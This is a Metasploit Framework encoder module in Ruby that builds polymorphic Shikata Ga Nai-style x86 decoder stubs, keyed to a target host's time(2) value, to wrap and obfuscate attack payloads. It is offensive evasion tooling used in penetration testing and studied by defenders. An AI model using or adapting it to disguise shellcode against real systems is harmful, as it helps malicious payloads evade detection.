##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/poly'

class MetasploitModule < Msf::Encoder::XorAdditiveFeedback

  # Manual ranking because the time(2) key is generated and supplied
  # manually.

  Rank = ManualRanking

  def initialize
    super(
      'Name' => 'time(2)-based Context Keyed Payload Encoder',
      'Description' => %q{
        This is a Context-Keyed Payload Encoder based on time(2)
        and Shikata Ga Nai.
      },
      'Author' => 'Dimitris Glynos',
      'Arch' => ARCH_X86,
      'License' => MSF_LICENSE,
      'Decoder' => {
        'KeySize' => 4,
        'BlockSize' => 4
      })

    register_options(
      [
        OptString.new(
          'TIME_KEY',
          [
            true,
            'TIME key from target host (see tools/context/time-key utility)',
            '0x00000000'
          ]
        )
      ]
    )
  end

  def obtain_key(_buf, _badchars, state)
    state.key = datastore['TIME_KEY'].hex
    return state.key
  end

  #
  # Generates the shikata decoder stub.
  #
  def decoder_stub(state)
    # If the decoder stub has not already been generated for this state, do
    # it now.  The decoder stub method may be called more than once.
    if state.decoder_stub.nil?
      # Shikata will only cut off the last 1-4 bytes of it's own end
      # depending on the alignment of the original buffer
      cutoff = 4 - (state.buf.length & 3)
      block = keygen_stub + generate_shikata_block(state, state.buf.length + cutoff, cutoff) || (raise BadGenerateError)

      # Take the last 1-4 bytes of shikata and prepend them to the buffer
      # that is going to be encoded to make it align on a 4-byte boundary.
      state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf

      # Cache this decoder stub.  The reason we cache the decoder stub is
      # because we need to ensure that the same stub is returned every time
      # for a given encoder state.
      state.decoder_stub = block
    end

    state.decoder_stub
  end

  protected

  def keygen_stub
    "\x31\xdb" + # xor %ebx,%ebx
      "\x8d\x43\x0d" +  # lea 0xd(%ebx),%eax
      "\xcd\x80" +      # int $0x80
      "\x66\x31\xc0"    # xor %ax,%ax
  end

  #
  # Returns the set of FPU instructions that can be used for the FPU block of
  # the decoder stub.
  #
  def fpu_instructions
    fpus = []

    0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
    0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
    0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
    0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
    0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }

    fpus << "\xd9\xd0"
    fpus << "\xd9\xe1"
    fpus << "\xd9\xf6"
    fpus << "\xd9\xf7"
    fpus << "\xd9\xe5"

    # This FPU instruction seems to fail consistently on Linux
    # fpus << "\xdb\xe1"

    fpus
  end

  #
  # Returns a polymorphic decoder stub that is capable of decoding a buffer
  # of the supplied length and encodes the last cutoff bytes of itself.
  #
  def generate_shikata_block(state, length, cutoff)
    # Declare logical registers
    key_reg = Rex::Poly::LogicalRegister::X86.new('key', 'eax')
    addr_reg = Rex::Poly::LogicalRegister::X86.new('addr')

    # Declare individual blocks
    endb = Rex::Poly::SymbolicBlock::End.new

    # FPU blocks
    fpu = Rex::Poly::LogicalBlock.new('fpu', *fpu_instructions)
    fnstenv = Rex::Poly::LogicalBlock.new('fnstenv', "\xd9\x74\x24\xf4")

    # Get EIP off the stack
    popeip = Rex::Poly::LogicalBlock.new(
      'popeip',
      proc { |b| (0x58 + b.regnum_of(addr_reg)).chr }
    )

    # Clear the counter register
    clear_register = Rex::Poly::LogicalBlock.new(
      'clear_register',
      "\x31\xc9",
      "\x29\xc9",
      "\x33\xc9",
      "\x2b\xc9"
    )

    # Initialize the counter after zeroing it
    init_counter = Rex::Poly::LogicalBlock.new('init_counter')

    # Divide the length by four but ensure that it aligns on a block size
    # boundary (4 byte).
    length += 4 + (4 - (length & 3)) & 3
    length /= 4

    if (length <= 255)
      init_counter.add_perm("\xb1" + [ length ].pack('C'))
    else
      init_counter.add_perm("\x66\xb9" + [ length ].pack('v'))
    end

    # Key initialization block

    # Decoder loop block
    loop_block = Rex::Poly::LogicalBlock.new('loop_block')

    xor = proc { |b| "\x31" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
    xor1 = proc { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }
    xor2 = proc { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }
    add = proc { |b| "\x03" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
    add1 = proc { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }
    add2 = proc { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }
    sub4 = proc { |b| "\x83" + (0xe8 + b.regnum_of(addr_reg)).chr + "\xfc" }
    add4 = proc { |b| "\x83" + (0xc0 + b.regnum_of(addr_reg)).chr + "\x04" }

    loop_block.add_perm(
      proc { |b| xor1.call(b) + add1.call(b) + sub4.call(b) },
      proc { |b| xor1.call(b) + sub4.call(b) + add2.call(b) },
      proc { |b| sub4.call(b) + xor2.call(b) + add2.call(b) },
      proc { |b| xor1.call(b) + add1.call(b) + add4.call(b) },
      proc { |b| xor1.call(b) + add4.call(b) + add2.call(b) },
      proc { |b| add4.call(b) + xor2.call(b) + add2.call(b) }
    )

    # Loop instruction block
    loop_inst = Rex::Poly::LogicalBlock.new(
      'loop_inst',
      "\xe2\xf5"
    )

    # Define block dependencies
    fnstenv.depends_on(fpu)
    popeip.depends_on(fnstenv)
    init_counter.depends_on(clear_register)
    loop_block.depends_on(popeip, init_counter)
    loop_inst.depends_on(loop_block)

    # Generate a permutation saving the EAX, ECX and ESP registers
    loop_inst.generate([
      Rex::Arch::X86::EAX,
      Rex::Arch::X86::ESP,
      Rex::Arch::X86::ECX
    ], nil, state.badchars)
  end
end
